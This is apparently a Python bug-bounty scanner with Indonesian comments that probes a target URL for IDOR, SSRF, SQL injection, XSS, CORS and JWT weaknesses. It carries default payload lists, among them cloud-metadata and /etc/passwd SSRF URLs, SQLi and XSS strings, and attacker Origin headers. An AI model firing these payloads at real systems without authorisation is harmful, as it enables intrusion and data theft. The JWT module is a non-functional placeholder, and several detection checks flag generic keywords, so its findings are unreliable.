#!/usr/bin/env python3
"""
BURPSUITE MINI ADVANCED - Bug Bounty Multi-Tool
Advanced CLI tool untuk bug bounty testing dengan semua konfigurasi dari command line
"""

import requests
import json
import time
import argparse
import sys
import re
import os
import concurrent.futures
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, asdict
from datetime import datetime
from pathlib import Path
import csv
import yaml
import hashlib
from urllib.parse import urlparse, urljoin, parse_qs, urlencode
from colorama import init, Fore, Style, Back

init(autoreset=True)

@dataclass
class TestResult:
    """Struktur data untuk hasil testing"""
    timestamp: str
    test_type: str
    url: str
    method: str
    status_code: int
    is_vulnerable: bool
    vulnerability_type: str
    severity: str
    data_exposed: Optional[Dict]
    error: Optional[str]
    evidence: str
    request_headers: Dict
    response_headers: Dict
    payload: Optional[str]
    response_time: float

@dataclass
class ScanConfig:
    """Konfigurasi scanning"""
    target_url: str
    auth_token: Optional[str]
    client_id: Optional[str]
    client_secret: Optional[str]
    redirect_uri: str = "http://localhost:8080"
    rate_limit: float = 0.5
    timeout: int = 15
    max_workers: int = 5
    user_agents: List[str] = None
    proxies: Dict[str, str] = None
    cookies: Dict[str, str] = None
    custom_headers: Dict[str, str] = None

class BurpMiniAdvanced:
    """BurpSuite-like CLI tool untuk bug bounty"""

    def __init__(self, config: ScanConfig):
        self.config = config
        self.session = requests.Session()
        self.results: List[TestResult] = []
        self.found_vulnerabilities: List[TestResult] = []

        # Setup session
        self._setup_session()

    def _setup_session(self):
        """Setup HTTP session dengan semua konfigurasi"""
        # Headers default
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/html, application/xhtml+xml',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        }

        # Add custom headers
        if self.config.custom_headers:
            headers.update(self.config.custom_headers)

        # Add auth if provided
        if self.config.auth_token:
            headers['Authorization'] = f'Bearer {self.config.auth_token}'

        # Add cookies
        if self.config.cookies:
            self.session.cookies.update(self.config.cookies)

        # Setup proxies
        if self.config.proxies:
            self.session.proxies.update(self.config.proxies)

        # Update session
        self.session.headers.update(headers)
        self.session.timeout = self.config.timeout

    def authenticate_google(self, auth_code: str = None) -> bool:
        """Autentikasi Google OAuth 2.0"""
        if not self.config.client_id or not self.config.client_secret:
            print(f"{Fore.RED}[-] Client ID dan Secret diperlukan untuk OAuth")
            return False

        token_url = "https://oauth2.googleapis.com/token"
        data = {
            'code': auth_code,
            'client_id': self.config.client_id,
            'client_secret': self.config.client_secret,
            'redirect_uri': self.config.redirect_uri,
            'grant_type': 'authorization_code'
        }

        try:
            response = self.session.post(token_url, data=data)
            if response.status_code == 200:
                tokens = response.json()
                self.config.auth_token = tokens.get('access_token')
                self.session.headers['Authorization'] = f'Bearer {self.config.auth_token}'
                print(f"{Fore.GREEN}[+] Google OAuth authentication successful!")
                return True
        except Exception as e:
            print(f"{Fore.RED}[-] Authentication failed: {e}")

        return False

    # ==================== IDOR TESTING MODULE ====================

    def scan_idor(self, endpoint_pattern: str, user_ids: List[str],
                  methods: List[str] = ["GET"], test_cases: List[Dict] = None) -> List[TestResult]:
        """Advanced IDOR scanning dengan berbagai test cases"""
        print(f"{Fore.CYAN}[*] Starting IDOR scan on: {endpoint_pattern}")

        results = []

        # Test cases default jika tidak disediakan
        if not test_cases:
            test_cases = [
                {"name": "no_auth", "auth": False, "expected": 401},
                {"name": "with_auth", "auth": True, "expected": "vary"},
                {"name": "other_user", "auth": True, "user_change": True, "expected": 403}
            ]

        for method in methods:
            for test_case in test_cases:
                for user_id in user_ids:
                    # Build URL
                    test_url = self._build_url(endpoint_pattern, user_id)

                    # Prepare request
                    auth_header = self.session.headers.get('Authorization') if test_case.get('auth', True) else None

                    # Send request
                    result = self._send_request(
                        url=test_url,
                        method=method,
                        auth_header=auth_header,
                        test_name=f"IDOR_{test_case['name']}"
                    )

                    # Analyze for IDOR
                    if self._analyze_idor(result, test_case):
                        result.is_vulnerable = True
                        result.vulnerability_type = "IDOR"
                        result.severity = self._determine_severity(result)
                        self.found_vulnerabilities.append(result)
                        print(f"{Fore.RED}[🔥] IDOR Found: {test_url}")

                    results.append(result)
                    time.sleep(self.config.rate_limit)

        return results

    # ==================== SSRF TESTING MODULE ====================

    def scan_ssrf(self, target_param: str, payloads: List[str] = None) -> List[TestResult]:
        """SSRF testing module"""
        print(f"{Fore.CYAN}[*] Starting SSRF scan...")

        if not payloads:
            payloads = [
                "http://169.254.169.254/latest/meta-data/",
                "http://localhost:80",
                "http://127.0.0.1:22",
                "http://[::1]:80",
                "file:///etc/passwd",
                "gopher://localhost:80",
                "dict://localhost:80"
            ]

        results = []

        for payload in payloads:
            # Test dengan berbagai method
            for method in ["GET", "POST"]:
                test_url = self._inject_payload(self.config.target_url, target_param, payload)

                result = self._send_request(
                    url=test_url,
                    method=method,
                    test_name=f"SSRF_{method}"
                )

                # Analyze for SSRF
                if self._analyze_ssrf(result, payload):
                    result.is_vulnerable = True
                    result.vulnerability_type = "SSRF"
                    result.severity = "High"
                    result.payload = payload
                    self.found_vulnerabilities.append(result)
                    print(f"{Fore.RED}[🔥] Potential SSRF: {payload}")

                results.append(result)
                time.sleep(self.config.rate_limit)

        return results

    # ==================== SQLI TESTING MODULE ====================

    def scan_sqli(self, target_param: str, payloads: List[str] = None) -> List[TestResult]:
        """SQL Injection testing"""
        print(f"{Fore.CYAN}[*] Starting SQL Injection scan...")

        if not payloads:
            payloads = [
                "' OR '1'='1",
                "' UNION SELECT NULL--",
                "1' AND SLEEP(5)--",
                "1' OR 1=1--",
                "' OR 1=1--",
                "admin'--",
                "' OR 'a'='a"
            ]

        results = []

        for payload in payloads:
            test_url = self._inject_payload(self.config.target_url, target_param, payload)

            result = self._send_request(
                url=test_url,
                method="GET",
                test_name="SQLi"
            )

            # Analyze for SQLi
            if self._analyze_sqli(result):
                result.is_vulnerable = True
                result.vulnerability_type = "SQL Injection"
                result.severity = "Critical"
                result.payload = payload
                self.found_vulnerabilities.append(result)
                print(f"{Fore.RED}[🔥] Potential SQLi: {payload[:30]}...")

            results.append(result)
            time.sleep(self.config.rate_limit)

        return results

    # ==================== XSS TESTING MODULE ====================

    def scan_xss(self, target_param: str, payloads: List[str] = None) -> List[TestResult]:
        """XSS testing module"""
        print(f"{Fore.CYAN}[*] Starting XSS scan...")

        if not payloads:
            payloads = [
                "<script>alert(1)</script>",
                "\"><script>alert(1)</script>",
                "'><script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "javascript:alert(1)",
                "onmouseover=alert(1)"
            ]

        results = []

        for payload in payloads:
            test_url = self._inject_payload(self.config.target_url, target_param, payload)

            result = self._send_request(
                url=test_url,
                method="GET",
                test_name="XSS"
            )

            # Analyze for XSS
            if self._analyze_xss(result, payload):
                result.is_vulnerable = True
                result.vulnerability_type = "Cross-Site Scripting"
                result.severity = "Medium"
                result.payload = payload
                self.found_vulnerabilities.append(result)
                print(f"{Fore.RED}[🔥] Potential XSS: {payload[:30]}...")

            results.append(result)
            time.sleep(self.config.rate_limit)

        return results

    # ==================== CORS TESTING MODULE ====================

    def scan_cors(self, origins: List[str] = None) -> List[TestResult]:
        """CORS misconfiguration testing"""
        print(f"{Fore.CYAN}[*] Starting CORS scan...")

        if not origins:
            origins = [
                "https://evil.com",
                "http://localhost",
                "null",
                "https://attacker.com",
                "https://" + self.config.target_url.replace("https://", "").split("/")[0]
            ]

        results = []

        for origin in origins:
            headers = {"Origin": origin}

            result = self._send_request(
                url=self.config.target_url,
                method="GET",
                custom_headers=headers,
                test_name="CORS"
            )

            # Analyze CORS headers
            if self._analyze_cors(result, origin):
                result.is_vulnerable = True
                result.vulnerability_type = "CORS Misconfiguration"
                result.severity = "Medium"
                result.payload = origin
                self.found_vulnerabilities.append(result)
                print(f"{Fore.RED}[🔥] Potential CORS issue with origin: {origin}")

            results.append(result)
            time.sleep(self.config.rate_limit)

        return results

    # ==================== JWT TESTING MODULE ====================

    def scan_jwt(self, jwt_token: str) -> List[TestResult]:
        """JWT vulnerability testing"""
        print(f"{Fore.CYAN}[*] Starting JWT scan...")

        results = []

        # Test berbagai manipulasi JWT
        jwt_tests = [
            {"name": "none_alg", "token": self._modify_jwt(jwt_token, {"alg": "none"})},
            {"name": "weak_secret", "token": self._modify_jwt(jwt_token, {}, secret="secret")},
            {"name": "empty_secret", "token": self._modify_jwt(jwt_token, {}, secret="")},
            {"name": "kid_injection", "token": self._modify_jwt(jwt_token, {"kid": "../../../etc/passwd"})},
        ]

        for test in jwt_tests:
            headers = {"Authorization": f"Bearer {test['token']}"}

            result = self._send_request(
                url=self.config.target_url,
                method="GET",
                custom_headers=headers,
                test_name=f"JWT_{test['name']}"
            )

            if result.status_code == 200:
                result.is_vulnerable = True
                result.vulnerability_type = "JWT Vulnerability"
                result.severity = "High"
                result.payload = test['name']
                self.found_vulnerabilities.append(result)
                print(f"{Fore.RED}[🔥] Potential JWT issue: {test['name']}")

            results.append(result)
            time.sleep(self.config.rate_limit)

        return results

    # ==================== ENDPOINT DISCOVERY ====================

    def discover_endpoints(self, wordlist: str = None) -> List[str]:
        """Endpoint discovery menggunakan wordlist"""
        print(f"{Fore.CYAN}[*] Starting endpoint discovery...")

        if not wordlist:
            # Common endpoint wordlist
            endpoints = [
                "/api/v1/users", "/api/users", "/v1/users", "/users",
                "/admin", "/api/admin", "/admin/api", "/api/v1/admin",
                "/api/v1/profile", "/profile", "/api/profile",
                "/api/v1/account", "/account", "/api/account",
                "/api/v1/settings", "/settings", "/api/settings",
                "/api/v1/config", "/config", "/api/config",
                "/api/v1/data", "/data", "/api/data",
                "/api/v1/files", "/files", "/api/files",
                "/api/v1/upload", "/upload", "/api/upload",
                "/api/v1/download", "/download", "/api/download",
                "/api/v1/search", "/search", "/api/search",
                "/api/v1/query", "/query", "/api/query",
            ]
        else:
            with open(wordlist, 'r') as f:
                endpoints = [line.strip() for line in f if line.strip()]

        discovered = []

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.config.max_workers) as executor:
            futures = []
            for endpoint in endpoints:
                test_url = urljoin(self.config.target_url, endpoint)
                futures.append(executor.submit(self._check_endpoint, test_url))

            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    discovered.append(result)
                    print(f"{Fore.GREEN}[+] Found: {result}")

        return discovered

    # ==================== HELPER METHODS ====================

    def _send_request(self, url: str, method: str = "GET", auth_header: str = None,
                     custom_headers: Dict = None, test_name: str = "Test") -> TestResult:
        """Send HTTP request dengan metrics lengkap"""
        start_time = time.time()

        # Prepare headers
        headers = self.session.headers.copy()
        if auth_header is False:
            headers.pop('Authorization', None)
        elif auth_header:
            headers['Authorization'] = auth_header

        if custom_headers:
            headers.update(custom_headers)

        try:
            if method.upper() == "GET":
                response = self.session.get(url, headers=headers)
            elif method.upper() == "POST":
                response = self.session.post(url, headers=headers)
            elif method.upper() == "PUT":
                response = self.session.put(url, headers=headers)
            elif method.upper() == "DELETE":
                response = self.session.delete(url, headers=headers)
            else:
                response = self.session.request(method, url, headers=headers)

            response_time = time.time() - start_time

            # Parse response
            data_exposed = None
            try:
                if response.text:
                    data_exposed = response.json()
            except:
                pass

            return TestResult(
                timestamp=datetime.now().isoformat(),
                test_type=test_name,
                url=url,
                method=method,
                status_code=response.status_code,
                is_vulnerable=False,
                vulnerability_type="",
                severity="",
                data_exposed=data_exposed,
                error=None,
                evidence=response.text[:2000],
                request_headers=dict(headers),
                response_headers=dict(response.headers),
                payload=None,
                response_time=response_time
            )

        except Exception as e:
            response_time = time.time() - start_time
            return TestResult(
                timestamp=datetime.now().isoformat(),
                test_type=test_name,
                url=url,
                method=method,
                status_code=0,
                is_vulnerable=False,
                vulnerability_type="",
                severity="",
                data_exposed=None,
                error=str(e),
                evidence="",
                request_headers=dict(headers),
                response_headers={},
                payload=None,
                response_time=response_time
            )

    def _analyze_idor(self, result: TestResult, test_case: Dict) -> bool:
        """Analyze response untuk IDOR"""
        if result.status_code == 200:
            # Check jika seharusnya di-forbidden
            if test_case.get('expected') in [401, 403]:
                return True

            # Check jika ada data sensitif
            sensitive_patterns = ['email', 'phone', 'address', 'password', 'token', 'ssn']
            evidence_lower = result.evidence.lower()
            for pattern in sensitive_patterns:
                if pattern in evidence_lower:
                    return True

        return False

    def _analyze_ssrf(self, result: TestResult, payload: str) -> bool:
        """Analyze untuk SSRF"""
        # Check untuk internal IP/domain dalam response
        internal_indicators = [
            "169.254.169.254",  # AWS metadata
            "localhost",
            "127.0.0.1",
            "0.0.0.0",
            "internal",
            "private",
            "passwd",
            "root:"
        ]

        for indicator in internal_indicators:
            if indicator in result.evidence:
                return True

        # Check untuk error messages yang mengindikasikan SSRF
        ssrf_errors = [
            "connection refused",
            "connection timeout",
            "no route to host",
            "name or service not known"
        ]

        for error in ssrf_errors:
            if error in result.evidence.lower():
                return True

        return False

    def _analyze_sqli(self, result: TestResult) -> bool:
        """Analyze untuk SQL Injection"""
        sql_errors = [
            "sql syntax",
            "mysql",
            "postgresql",
            "oracle",
            "sqlite",
            "syntax error",
            "unclosed quotation",
            "unknown column",
            "table .* doesn't exist",
            "you have an error in your sql"
        ]

        evidence_lower = result.evidence.lower()
        for error in sql_errors:
            if re.search(error, evidence_lower, re.IGNORECASE):
                return True

        # Check untuk perbedaan response time (time-based SQLi)
        if result.response_time > 5:  # Jika response > 5 detik
            return True

        return False

    def _analyze_xss(self, result: TestResult, payload: str) -> bool:
        """Analyze untuk XSS"""
        # Check jika payload ada di response (reflected XSS)
        if payload in result.evidence:
            return True

        # Check untuk error messages
        xss_errors = [
            "script",
            "onerror",
            "onload",
            "javascript:",
            "<script>"
        ]

        for error in xss_errors:
            if error in result.evidence.lower():
                return True

        return False

    def _analyze_cors(self, result: TestResult, origin: str) -> bool:
        """Analyze untuk CORS misconfiguration"""
        cors_headers = result.response_headers.get('Access-Control-Allow-Origin', '')

        # Check jika origin di-allow
        if cors_headers == "*":
            return True

        if origin in cors_headers:
            # Check jika credentials allowed dengan wildcard
            if result.response_headers.get('Access-Control-Allow-Credentials') == 'true':
                return True

        return False

    def _determine_severity(self, result: TestResult) -> str:
        """Tentukan severity berdasarkan context"""
        if result.status_code == 200:
            # Check untuk data sensitif
            sensitive_data = ['password', 'token', 'secret', 'key', 'ssn', 'credit']
            if any(s in result.evidence.lower() for s in sensitive_data):
                return "Critical"
            return "High"
        return "Medium"

    def _build_url(self, pattern: str, user_id: str) -> str:
        """Build URL dengan user_id"""
        return pattern.replace("{id}", str(user_id)).replace("{user_id}", str(user_id))

    def _inject_payload(self, url: str, param: str, payload: str) -> str:
        """Inject payload ke URL parameter"""
        parsed = urlparse(url)
        query = parse_qs(parsed.query)

        if param in query:
            query[param] = [payload]
        else:
            # Jika parameter tidak ada, tambahkan
            query[param] = [payload]

        new_query = urlencode(query, doseq=True)
        return parsed._replace(query=new_query).geturl()

    def _modify_jwt(self, token: str, headers: Dict = None, secret: str = None) -> str:
        """Modify JWT untuk testing"""
        # Implementasi sederhana - dalam real tool butuh library PyJWT
        return token  # Placeholder

    def _check_endpoint(self, url: str) -> Optional[str]:
        """Check jika endpoint exists"""
        try:
            response = self.session.head(url, timeout=5)
            if response.status_code < 400:
                return url
        except:
            pass
        return None

    # ==================== REPORTING ====================

    def generate_report(self, output_dir: str = "reports"):
        """Generate comprehensive report"""
        Path(output_dir).mkdir(exist_ok=True)

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

        # JSON Report
        json_report = {
            "scan_date": datetime.now().isoformat(),
            "target": self.config.target_url,
            "total_tests": len(self.results),
            "vulnerabilities_found": len(self.found_vulnerabilities),
            "results": [asdict(r) for r in self.results],
            "vulnerabilities": [asdict(v) for v in self.found_vulnerabilities]
        }

        with open(f"{output_dir}/scan_{timestamp}.json", 'w') as f:
            json.dump(json_report, f, indent=2)

        # CSV Report
        with open(f"{output_dir}/scan_{timestamp}.csv", 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow([
                "Timestamp", "Test Type", "URL", "Method", "Status",
                "Vulnerable", "Vuln Type", "Severity", "Response Time"
            ])

            for result in self.results:
                writer.writerow([
                    result.timestamp,
                    result.test_type,
                    result.url[:100],
                    result.method,
                    result.status_code,
                    result.is_vulnerable,
                    result.vulnerability_type,
                    result.severity,
                    f"{result.response_time:.2f}s"
                ])

        # Markdown Report
        with open(f"{output_dir}/scan_{timestamp}.md", 'w') as f:
            f.write(f"# Bug Bounty Scan Report\n\n")
            f.write(f"**Scan Date**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"**Target**: `{self.config.target_url}`\n")
            f.write(f"**Total Tests**: {len(self.results)}\n")
            f.write(f"**Vulnerabilities Found**: {len(self.found_vulnerabilities)}\n\n")

            if self.found_vulnerabilities:
                f.write("## 🔥 Vulnerabilities Found\n\n")
                for i, vuln in enumerate(self.found_vulnerabilities, 1):
                    f.write(f"### {i}. {vuln.vulnerability_type} ({vuln.severity})\n\n")
                    f.write(f"- **URL**: `{vuln.method} {vuln.url}`\n")
                    f.write(f"- **Status Code**: {vuln.status_code}\n")
                    f.write(f"- **Response Time**: {vuln.response_time:.2f}s\n")
                    f.write(f"- **Evidence**:\n```\n{vuln.evidence[:300]}\n```\n\n")
            else:
                f.write("## ✅ No Critical Vulnerabilities Found\n\n")

            f.write("## 📊 Scan Statistics\n\n")
            f.write("```\n")
            f.write(f"Total Requests: {len(self.results)}\n")
            f.write(f"Successful (2xx): {sum(1 for r in self.results if 200 <= r.status_code < 300)}\n")
            f.write(f"Client Errors (4xx): {sum(1 for r in self.results if 400 <= r.status_code < 500)}\n")
            f.write(f"Server Errors (5xx): {sum(1 for r in self.results if 500 <= r.status_code < 600)}\n")
            f.write(f"Average Response Time: {sum(r.response_time for r in self.results)/len(self.results):.2f}s\n")
            f.write("```\n")

        print(f"{Fore.GREEN}[+] Reports generated in '{output_dir}/'")
        print(f"{Fore.GREEN}[+] Found {len(self.found_vulnerabilities)} vulnerabilities")

def main():
    parser = argparse.ArgumentParser(
        description='BurpSuite Mini Advanced - Bug Bounty Multi-Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
╔══════════════════════════════════════════════════════════════╗
║                  EXAMPLES OF USAGE                           ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║  1. IDOR Scan:                                               ║
║     python3 burpmini.py -u https://api.target.com/users/{id}║
║          --scan idor --user-ids 1,2,3,4,5                   ║
║                                                              ║
║  2. Full Scan dengan semua modules:                         ║
║     python3 burpmini.py -u https://target.com/api           ║
║          --scan all --token ya29.a0AfH6S...                 ║
║                                                              ║
║  3. SSRF Testing:                                            ║
║     python3 burpmini.py -u https://target.com/webhook       ║
║          --scan ssrf --param url --rate-limit 1.0           ║
║                                                              ║
║  4. Endpoint Discovery:                                      ║
║     python3 burpmini.py -u https://target.com               ║
║          --discover --workers 10                            ║
║                                                              ║
║  5. Load config dari file:                                   ║
║     python3 burpmini.py --config config.yaml                ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
        """
    )

    # Target options
    parser.add_argument('-u', '--url', help='Target URL')
    parser.add_argument('--config', help='Load config from YAML file')

    # Authentication options
    parser.add_argument('-t', '--token', help='Bearer token untuk auth')
    parser.add_argument('--client-id', help='OAuth Client ID')
    parser.add_argument('--client-secret', help='OAuth Client Secret')
    parser.add_argument('--auth-code', help='OAuth authorization code')
    parser.add_argument('--cookie', help='Cookie string')

    # Scan options
    parser.add_argument('--scan', choices=['idor', 'ssrf', 'sqli', 'xss', 'cors', 'jwt', 'all'],
                       help='Type of scan to perform')
    parser.add_argument('--discover', action='store_true', help='Discover endpoints')

    # Scan parameters
    parser.add_argument('--param', help='Parameter name untuk testing')
    parser.add_argument('--endpoint', help='Endpoint pattern dengan {id} placeholder')
    parser.add_argument('--user-ids', help='Comma-separated user IDs untuk IDOR testing')
    parser.add_argument('--jwt-token', help='JWT token untuk testing')

    # Performance options
    parser.add_argument('--rate-limit', type=float, default=0.5,
                       help='Delay antara requests (default: 0.5s)')
    parser.add_argument('--timeout', type=int, default=15,
                       help='Request timeout (default: 15s)')
    parser.add_argument('--workers', type=int, default=5,
                       help='Max workers untuk parallel scanning (default: 5)')

    # Output options
    parser.add_argument('--output', default='reports',
                       help='Output directory untuk reports (default: reports)')
    parser.add_argument('--verbose', action='store_true',
                       help='Show detailed output')

    args = parser.parse_args()

    # Banner
    print(f"\n{Fore.CYAN}{'='*70}")
    print(f"{Fore.YELLOW}╔═╗╦ ╦╔═╗╔═╗╦ ╦╔═╗╦╔╗ ╔═╗╔╦╗")
    print(f"{Fore.YELLOW}╠═╝║ ║╠═╝║  ╠═╣║ ║║╠╩╗║ ║ ║ ")
    print(f"{Fore.YELLOW}╩  ╚═╝╩  ╚═╝╩ ╩╚═╝╩╚═╝╚═╝ ╩ ")
    print(f"{Fore.CYAN}{'='*70}")
    print(f"{Fore.WHITE}BurpSuite Mini Advanced - Bug Bounty Multi-Tool")
    print(f"{Fore.CYAN}{'='*70}\n")

    # Load config dari file atau args
    if args.config:
        with open(args.config, 'r') as f:
            config_data = yaml.safe_load(f)
        config = ScanConfig(**config_data)
    else:
        if not args.url:
            print(f"{Fore.RED}[-] Error: Target URL diperlukan")
            sys.exit(1)

        # Parse cookies
        cookies = {}
        if args.cookie:
            for cookie in args.cookie.split(';'):
                if '=' in cookie:
                    key, value = cookie.strip().split('=', 1)
                    cookies[key] = value

        config = ScanConfig(
            target_url=args.url,
            auth_token=args.token,
            client_id=args.client_id,
            client_secret=args.client_secret,
            rate_limit=args.rate_limit,
            timeout=args.timeout,
            max_workers=args.workers,
            cookies=cookies
        )

    # Initialize scanner
    scanner = BurpMiniAdvanced(config)

    # Authenticate jika perlu
    if args.auth_code and args.client_id and args.client_secret:
        if not scanner.authenticate_google(args.auth_code):
            print(f"{Fore.RED}[-] Authentication failed")
            sys.exit(1)

    all_results = []

    # Endpoint discovery
    if args.discover:
        print(f"{Fore.CYAN}[*] Running endpoint discovery...")
        endpoints = scanner.discover_endpoints()
        print(f"{Fore.GREEN}[+] Found {len(endpoints)} endpoints")
        for endpoint in endpoints:
            print(f"    {endpoint}")

    # Scanning
    if args.scan:
        print(f"\n{Fore.CYAN}[*] Starting {args.scan.upper()} scan...")

        if args.scan == "idor" or args.scan == "all":
            if args.endpoint and args.user_ids:
                user_ids = [uid.strip() for uid in args.user_ids.split(',')]
                results = scanner.scan_idor(args.endpoint, user_ids)
                all_results.extend(results)
            else:
                print(f"{Fore.YELLOW}[!] Skipping IDOR: --endpoint dan --user-ids diperlukan")

        if args.scan == "ssrf" or args.scan == "all":
            if args.param:
                results = scanner.scan_ssrf(args.param)
                all_results.extend(results)
            else:
                print(f"{Fore.YELLOW}[!] Skipping SSRF: --param diperlukan")

        if args.scan == "sqli" or args.scan == "all":
            if args.param:
                results = scanner.scan_sqli(args.param)
                all_results.extend(results)
            else:
                print(f"{Fore.YELLOW}[!] Skipping SQLi: --param diperlukan")

        if args.scan == "xss" or args.scan == "all":
            if args.param:
                results = scanner.scan_xss(args.param)
                all_results.extend(results)
            else:
                print(f"{Fore.YELLOW}[!] Skipping XSS: --param diperlukan")

        if args.scan == "cors" or args.scan == "all":
            results = scanner.scan_cors()
            all_results.extend(results)

        if args.scan == "jwt" or args.scan == "all":
            if args.jwt_token:
                results = scanner.scan_jwt(args.jwt_token)
                all_results.extend(results)
            else:
                print(f"{Fore.YELLOW}[!] Skipping JWT: --jwt-token diperlukan")

    # Simpan results
    scanner.results = all_results

    # Generate report
    if all_results:
        scanner.generate_report(args.output)
    else:
        print(f"{Fore.YELLOW}[!] No scan results to report")

    # Summary
    print(f"\n{Fore.CYAN}{'='*70}")
    print(f"{Fore.GREEN}[✓] Scan completed successfully!")
    if scanner.found_vulnerabilities:
        print(f"{Fore.RED}[!] Found {len(scanner.found_vulnerabilities)} vulnerabilities!")
        for vuln in scanner.found_vulnerabilities:
            print(f"    {vuln.vulnerability_type} ({vuln.severity}) - {vuln.url}")
    else:
        print(f"{Fore.GREEN}[✓] No vulnerabilities found")
    print(f"{Fore.CYAN}{'='*70}")

if __name__ == "__main__":
    main()
